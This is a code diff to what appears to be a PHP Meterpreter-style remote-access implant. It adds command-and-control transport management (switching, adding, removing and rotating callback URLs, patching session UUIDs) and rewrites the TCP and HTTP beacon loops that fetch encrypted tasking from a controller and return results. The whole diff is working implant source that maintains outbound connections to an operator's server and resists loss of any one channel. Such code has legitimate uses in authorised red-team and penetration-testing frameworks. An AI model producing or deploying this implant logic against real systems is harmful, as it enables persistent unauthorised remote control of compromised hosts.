@@ -259,6 +259,7 @@ define("TLV_TYPE_C2_SUFFIX_SKIP",      TLV_META_TYPE_UINT   | 722);
 define("TLV_TYPE_C2_UUID_COOKIE",      TLV_META_TYPE_STRING | 723);
 define("TLV_TYPE_C2_UUID_GET",         TLV_META_TYPE_STRING | 724);
 define("TLV_TYPE_C2_UUID_HEADER",      TLV_META_TYPE_STRING | 725);
+define("TLV_TYPE_C2_UUID",             TLV_META_TYPE_STRING | 726);
 
 # C2 encoding constants
 define("C2_ENCODING_NONE",   0);
@@ -573,7 +574,9 @@ if (!function_exists('core_shutdown')) {
   register_command('core_shutdown', COMMAND_ID_CORE_SHUTDOWN);
   function core_shutdown($req, &$pkt) {
     my_print("doing core shutdown");
-    die();
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, true));
+    $GLOBALS['running'] = false;
+    return ERROR_SUCCESS;
   }
 }
 
@@ -745,6 +748,126 @@ if (!function_exists('core_machine_id')) {
   # Channel Helper Functions
   ##
 }
+
+if (!function_exists('core_patch_uuid')) {
+  register_command('core_patch_uuid', COMMAND_ID_CORE_PATCH_UUID);
+  function core_patch_uuid($req, &$pkt) {
+    my_print("doing core_patch_uuid");
+    $cur_idx = $GLOBALS['current_transport_idx'];
+    $transport = &$GLOBALS['transport_list'][$cur_idx];
+    if ($transport['type'] != 'http') {
+      return ERROR_FAILURE;
+    }
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
+    if ($tlv == null) { return ERROR_FAILURE; }
+    $new_uuid = $tlv['value'];
+    $parts = parse_url($transport['url']);
+    if (!isset($parts['scheme']) || !isset($parts['host'])) {
+      return ERROR_FAILURE;
+    }
+    $port = isset($parts['port']) ? ':' . $parts['port'] : '';
+    $transport['url'] = $parts['scheme'] . '://' . $parts['host'] . $port . '/' . $new_uuid;
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_list')) {
+  register_command('core_transport_list', COMMAND_ID_CORE_TRANSPORT_LIST);
+  function core_transport_list($req, &$pkt) {
+    my_print("doing core_transport_list");
+    $expiry = $GLOBALS['session_expiry_end'] - time();
+    if ($expiry < 0) { $expiry = 0; }
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_EXPIRY, $expiry));
+    # Emit current first, then rotate forward (matches Python ordering)
+    $cur = $GLOBALS['current_transport_idx'];
+    $count = count($GLOBALS['transport_list']);
+    for ($i = 0; $i < $count; $i++) {
+      $idx = ($cur + $i) % $count;
+      $t = $GLOBALS['transport_list'][$idx];
+      packet_add_tlv($pkt, create_tlv(TLV_TYPE_C2, tlv_pack_transport_group($t)));
+    }
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_next')) {
+  register_command('core_transport_next', COMMAND_ID_CORE_TRANSPORT_NEXT);
+  function core_transport_next($req, &$pkt) {
+    my_print("doing core_transport_next");
+    $new_idx = transport_next_idx();
+    if ($new_idx == $GLOBALS['current_transport_idx']) {
+      return ERROR_FAILURE;
+    }
+    request_transport_switch($new_idx);
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_prev')) {
+  register_command('core_transport_prev', COMMAND_ID_CORE_TRANSPORT_PREV);
+  function core_transport_prev($req, &$pkt) {
+    my_print("doing core_transport_prev");
+    $new_idx = transport_prev_idx();
+    if ($new_idx == $GLOBALS['current_transport_idx']) {
+      return ERROR_FAILURE;
+    }
+    request_transport_switch($new_idx);
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_add')) {
+  register_command('core_transport_add', COMMAND_ID_CORE_TRANSPORT_ADD);
+  function core_transport_add($req, &$pkt) {
+    my_print("doing core_transport_add");
+    $t = parse_transport_from_request($req);
+    if ($t == null) { return ERROR_FAILURE; }
+    # Insert before the current transport; current_transport_idx shifts forward
+    # to keep pointing at the same transport object.
+    $cur = $GLOBALS['current_transport_idx'];
+    array_splice($GLOBALS['transport_list'], $cur, 0, array($t));
+    $GLOBALS['current_transport_idx'] = $cur + 1;
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_remove')) {
+  register_command('core_transport_remove', COMMAND_ID_CORE_TRANSPORT_REMOVE);
+  function core_transport_remove($req, &$pkt) {
+    my_print("doing core_transport_remove");
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_URL);
+    if ($tlv == null) { return ERROR_FAILURE; }
+    $url = $tlv['value'];
+    $cur_idx = $GLOBALS['current_transport_idx'];
+    if ($GLOBALS['transport_list'][$cur_idx]['url'] == $url) {
+      # Can't remove the active transport
+      return ERROR_FAILURE;
+    }
+    $rm_idx = transport_find_idx_by_url($url);
+    if ($rm_idx < 0) { return ERROR_FAILURE; }
+    array_splice($GLOBALS['transport_list'], $rm_idx, 1);
+    if ($rm_idx < $cur_idx) {
+      $GLOBALS['current_transport_idx']--;
+    }
+    return ERROR_SUCCESS;
+  }
+}
+
+if (!function_exists('core_transport_change')) {
+  register_command('core_transport_change', COMMAND_ID_CORE_TRANSPORT_CHANGE);
+  function core_transport_change($req, &$pkt) {
+    my_print("doing core_transport_change");
+    $t = parse_transport_from_request($req);
+    if ($t == null) { return ERROR_FAILURE; }
+    # Insert AFTER the current transport so the response still goes out on
+    # the old one. Request a switch to the newly-inserted index.
+    $cur = $GLOBALS['current_transport_idx'];
+    array_splice($GLOBALS['transport_list'], $cur + 1, 0, array($t));
+    request_transport_switch($cur + 1);
+    return ERROR_SUCCESS;
+  }
+}
+
 $channels = array();
 
 function register_channel($in, $out=null, $err=null) {
@@ -1244,6 +1367,230 @@ function parse_config_block($raw) {
   $config['transports'] = $transports;
 
   return $config;
+}
+
+##
+# Multi-transport rotation helpers
+##
+define('DISPATCH_EXIT', 0);     # session ended or shutdown requested
+define('DISPATCH_RETIRE', 1);   # current transport timed out / disconnected
+define('DISPATCH_SWITCH', 2);   # explicit transport switch requested
+
+function transport_next_idx($idx = null) {
+  if ($idx === null) { $idx = $GLOBALS['current_transport_idx']; }
+  $count = count($GLOBALS['transport_list']);
+  return ($idx + 1) % $count;
+}
+
+function transport_prev_idx($idx = null) {
+  if ($idx === null) { $idx = $GLOBALS['current_transport_idx']; }
+  $count = count($GLOBALS['transport_list']);
+  return ($idx - 1 + $count) % $count;
+}
+
+function transport_find_idx_by_url($url) {
+  foreach ($GLOBALS['transport_list'] as $i => $t) {
+    if ($t['url'] == $url) { return $i; }
+  }
+  return -1;
+}
+
+function request_transport_switch($new_idx) {
+  $GLOBALS['next_transport_idx'] = $new_idx;
+}
+
+function parse_transport_from_request($req) {
+  # Mirror parse_config_block per-transport parsing, but from a TLV packet
+  # (with header) instead of a raw C2 group's bytes.
+  $url_tlv = packet_get_tlv($req, TLV_TYPE_C2_URL);
+  if ($url_tlv == null) { return null; }
+  $t = array('url' => $url_tlv['value']);
+
+  $tlv = packet_get_tlv($req, TLV_TYPE_C2_COMM_TIMEOUT);
+  $t['comm_timeout'] = ($tlv != null) ? $tlv['value'] : 300;
+  $tlv = packet_get_tlv($req, TLV_TYPE_C2_RETRY_TOTAL);
+  $t['retry_total'] = ($tlv != null) ? $tlv['value'] : 3600;
+  $tlv = packet_get_tlv($req, TLV_TYPE_C2_RETRY_WAIT);
+  $t['retry_wait'] = ($tlv != null) ? $tlv['value'] : 10;
+
+  if (strpos($t['url'], 'http') === 0) {
+    $t['type'] = 'http';
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UA);
+    $t['ua'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_URL);
+    $t['proxy_url'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_USER);
+    $t['proxy_user'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_PROXY_PASS);
+    $t['proxy_pass'] = ($tlv != null) ? $tlv['value'] : null;
+    $tlv = packet_get_tlv($req, TLV_TYPE_C2_HEADERS);
+    $t['custom_headers'] = ($tlv != null) ? $tlv['value'] : null;
+
+    $get_group = packet_get_tlv($req, TLV_TYPE_C2_GET);
+    $t['c2_get'] = ($get_group != null) ? parse_c2_verb_config($get_group['value']) : null;
+    $post_group = packet_get_tlv($req, TLV_TYPE_C2_POST);
+    $t['c2_post'] = ($post_group != null) ? parse_c2_verb_config($post_group['value']) : null;
+  } else {
+    $t['type'] = 'tcp';
+  }
+  return $t;
+}
+
+function tlv_pack_transport_group($t) {
+  $group  = tlv_pack(create_tlv(TLV_TYPE_C2_URL, $t['url']));
+  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_COMM_TIMEOUT, $t['comm_timeout']));
+  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_RETRY_TOTAL, $t['retry_total']));
+  $group .= tlv_pack(create_tlv(TLV_TYPE_C2_RETRY_WAIT, $t['retry_wait']));
+  if ($t['type'] == 'http') {
+    if (!empty($t['ua'])) {
+      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_UA, $t['ua']));
+    }
+    if (!empty($t['proxy_url'])) {
+      $group .= tlv_pack(create_tlv(TLV_TYPE_C2_PROXY_URL, $t['proxy_url']));
+    }
+  }
+  return $group;
+}
+
+function activate_transport(&$transport) {
+  if ($transport['type'] == 'http') {
+    return true;
+  }
+  # TCP: use the pre-connected stager socket on the first attempt of the first
+  # transport. Subsequent TCP transports must open a fresh socket.
+  if (isset($GLOBALS['msgsock']) && empty($GLOBALS['_msgsock_consumed'])) {
+    $msgsock = $GLOBALS['msgsock'];
+    $msgsock_type = $GLOBALS['msgsock_type'];
+    switch ($msgsock_type) {
+      case 'socket':
+        register_socket($msgsock);
+        break;
+      case 'stream':
+      default:
+        register_stream($msgsock);
+    }
+    $transport['_socket'] = $msgsock;
+    $GLOBALS['_msgsock_consumed'] = true;
+    return true;
+  }
+  $url_parts = parse_url($transport['url']);
+  if (!isset($url_parts['host']) || !isset($url_parts['port'])) {
+    my_print("Invalid TCP transport URL: " . $transport['url']);
+    return false;
+  }
+  my_print("TCP transport, connecting to " . $url_parts['host'] . ":" . $url_parts['port']);
+  $sock = connect($url_parts['host'], $url_parts['port']);
+  if (!$sock) { return false; }
+  $transport['_socket'] = $sock;
+  return true;
+}
+
+function activate_transport_with_retry(&$transport) {
+  $end = time() + $transport['retry_total'];
+  $first = true;
+  while (time() < $end) {
+    if (!$first) {
+      $wait = max(1, (int)$transport['retry_wait']);
+      sleep($wait);
+    }
+    if (activate_transport($transport)) {
+      return true;
+    }
+    $first = false;
+  }
+  return false;
+}
+
+function dispatch_tcp(&$transport) {
+  $msgsock = $transport['_socket'];
+  add_reader($msgsock);
+  $r = $GLOBALS['readers'];
+  $w = null; $e = null; $t = 1;
+  while (false !== ($cnt = select($r, $w, $e, $t))) {
+    if (empty($GLOBALS['running']) || time() > $GLOBALS['session_expiry_end']) {
+      remove_reader($msgsock); close($msgsock);
+      return DISPATCH_EXIT;
+    }
+    if ($GLOBALS['next_transport_idx'] !== null) {
+      remove_reader($msgsock); close($msgsock);
+      return DISPATCH_SWITCH;
+    }
+    for ($i = 0; $i < $cnt; $i++) {
+      $ready = $r[$i];
+      if ($ready == $msgsock) {
+        $packet = read($msgsock, 32);
+        if (false == $packet) {
+          remove_reader($msgsock); close($msgsock);
+          return DISPATCH_RETIRE;
+        }
+        $xor = substr($packet, 0, 4);
+        $header = xor_bytes($xor, substr($packet, 4, 28));
+        $len_array = unpack("Nlen", substr($header, 20, 4));
+        $len = $len_array['len'] + 32 - 8;
+        while (strlen($packet) < $len) {
+          $packet .= read($msgsock, $len - strlen($packet));
+        }
+        $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+        write_tlv_to_socket($msgsock, $response);
+      } else {
+        $data = read($ready);
+        if (false === $data) {
+          handle_dead_resource_channel($ready);
+        } elseif (strlen($data) > 0) {
+          $request = handle_resource_read_channel($ready, $data);
+          if ($request) {
+            write_tlv_to_socket($msgsock, $request);
+          }
+        }
+      }
+    }
+    $r = $GLOBALS['readers'];
+  }
+  remove_reader($msgsock); close($msgsock);
+  return DISPATCH_RETIRE;
+}
+
+function dispatch_http(&$transport) {
+  my_print("Starting HTTP transport to " . $transport['url']);
+  $last_packet_time = time();
+  $empty_count = 0;
+
+  while (true) {
+    if (empty($GLOBALS['running']) || time() >= $GLOBALS['session_expiry_end']) {
+      return DISPATCH_EXIT;
+    }
+    if ($GLOBALS['next_transport_idx'] !== null) {
+      return DISPATCH_SWITCH;
+    }
+    if (time() > $last_packet_time + $transport['comm_timeout']) {
+      my_print("Communication timeout reached");
+      return DISPATCH_RETIRE;
+    }
+
+    $raw = http_get_packet($transport);
+
+    if ($raw != null && strlen($raw) >= 32) {
+      $empty_count = 0;
+      $last_packet_time = time();
+
+      $xor = substr($raw, 0, 4);
+      $decrypted = decrypt_packet(xor_bytes($xor, $raw));
+      $response = create_response($decrypted);
+
+      $xor_key = rand_xor_key();
+      $encrypted = encrypt_packet($response);
+      $packet = $xor_key . xor_bytes($xor_key, $encrypted);
+      http_send_packet($transport, $packet);
+    } else {
+      if ($raw !== null) {
+        # empty 200: connection is alive
+        $last_packet_time = time();
+      }
+      $delay = min(10, $empty_count * 0.1);
+      $empty_count++;
+      usleep((int)($delay * 1000000));
+    }
+  }
 }
 
 function packet_get_all_tlvs($pkt, $type) {
@@ -1816,116 +2163,44 @@ if ($config['debug_log'] != null && strlen($config['debug_log']) > 0) {
 
 $GLOBALS['transport_list'] = $config['transports'];
 $GLOBALS['current_transport_idx'] = 0;
+$GLOBALS['next_transport_idx'] = null;
 $GLOBALS['session_expiry_end'] = time() + $config['session_expiry'];
+$GLOBALS['running'] = true;
 
-$transport = $GLOBALS['transport_list'][0];
+#
+# Outer transport-rotation loop: activate the current transport (with retry),
+# dispatch on it, then rotate forward or switch as directed.
+#
+while ($GLOBALS['running'] && time() < $GLOBALS['session_expiry_end']) {
+  $idx = $GLOBALS['current_transport_idx'];
+  $transport = &$GLOBALS['transport_list'][$idx];
 
-if ($transport['type'] == 'tcp') {
-  # For TCP transports: use the pre-connected stager socket if available,
-  # otherwise connect fresh.
-  if (isset($GLOBALS['msgsock'])) {
-    $msgsock = $GLOBALS['msgsock'];
-    $msgsock_type = $GLOBALS['msgsock_type'];
-    switch ($msgsock_type) {
-    case 'socket':
-      register_socket($msgsock);
-      break;
-    case 'stream':
-    default:
-      register_stream($msgsock);
-    }
+  if (!activate_transport_with_retry($transport)) {
+    my_print("Failed to activate transport[$idx], rotating");
+    $GLOBALS['current_transport_idx'] = transport_next_idx($idx);
+    unset($transport);
+    continue;
+  }
+
+  if ($transport['type'] == 'tcp') {
+    $result = dispatch_tcp($transport);
+    my_print("Finished TCP transport");
   } else {
-    # Parse host:port from tcp://host:port URL
-    $url_parts = parse_url($transport['url']);
-    $ipaddr = $url_parts['host'];
-    $port = $url_parts['port'];
-    my_print("TCP transport, connecting to $ipaddr:$port");
-    $msgsock = connect($ipaddr, $port);
-    if (!$msgsock) { die(); }
+    $result = dispatch_http($transport);
+    my_print("Finished HTTP transport");
   }
-  add_reader($msgsock);
 
-  #
-  # TCP main dispatch loop
-  #
-  $r=$GLOBALS['readers'];
-  $w=NULL;$e=NULL;$t=1;
-  while (false !== ($cnt = select($r, $w, $e, $t))) {
-    if (time() > $GLOBALS['session_expiry_end']) { break; }
-    for ($i = 0; $i < $cnt; $i++) {
-      $ready = $r[$i];
-      if ($ready == $msgsock) {
-        $packet = read($msgsock, 32);
-        if (false==$packet) {
-          break 2;
-        }
-        $xor = substr($packet, 0, 4);
-        $header = xor_bytes($xor, substr($packet, 4, 28));
-        $len_array = unpack("Nlen", substr($header, 20, 4));
-        $len = $len_array['len'] + 32 - 8;
-        while (strlen($packet) < $len) {
-          $packet .= read($msgsock, $len-strlen($packet));
-        }
-        $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
-        write_tlv_to_socket($msgsock, $response);
-      } else {
-        $data = read($ready);
-        if (false === $data) {
-          handle_dead_resource_channel($ready);
-        } elseif (strlen($data) > 0){
-          $request = handle_resource_read_channel($ready, $data);
-          if ($request) {
-            write_tlv_to_socket($msgsock, $request);
-          }
-        }
-      }
-    }
-    $r = $GLOBALS['readers'];
+  if ($result == DISPATCH_EXIT) {
+    unset($transport);
+    break;
   }
-  my_print("Finished TCP transport");
-  close($msgsock);
-
-} elseif ($transport['type'] == 'http') {
-  #
-  # HTTP(S) main dispatch loop - stateless GET/POST cycle
-  #
-  my_print("Starting HTTP transport to " . $transport['url']);
-  $last_packet_time = time();
-  $empty_count = 0;
-
-  while (time() < $GLOBALS['session_expiry_end']) {
-    if (time() > $last_packet_time + $transport['comm_timeout']) {
-      my_print("Communication timeout reached");
-      break;
-    }
-
-    # GET - poll for a request from the server
-    $raw = http_get_packet($transport);
-
-    if ($raw != null && strlen($raw) >= 32) {
-      $empty_count = 0;
-      $last_packet_time = time();
-
-      $xor = substr($raw, 0, 4);
-      $decrypted = decrypt_packet(xor_bytes($xor, $raw));
-      $response = create_response($decrypted);
-
-      # POST - send the response back
-      $xor_key = rand_xor_key();
-      $encrypted = encrypt_packet($response);
-      $packet = $xor_key . xor_bytes($xor_key, $encrypted);
-      http_send_packet($transport, $packet);
-    } else {
-      # Server had nothing for us, back off
-      if ($raw !== null) {
-        # Got an empty 200 response - connection is alive
-        $last_packet_time = time();
-      }
-      $delay = min(10, $empty_count * 0.1);
-      $empty_count++;
-      usleep((int)($delay * 1000000));
-    }
+  if ($result == DISPATCH_SWITCH) {
+    $GLOBALS['current_transport_idx'] = $GLOBALS['next_transport_idx'];
+    $GLOBALS['next_transport_idx'] = null;
+  } else {
+    # DISPATCH_RETIRE: rotate forward
+    $GLOBALS['current_transport_idx'] = transport_next_idx($idx);
   }
-  my_print("Finished HTTP transport");
+  unset($transport);
 }
 my_print("--------------------");
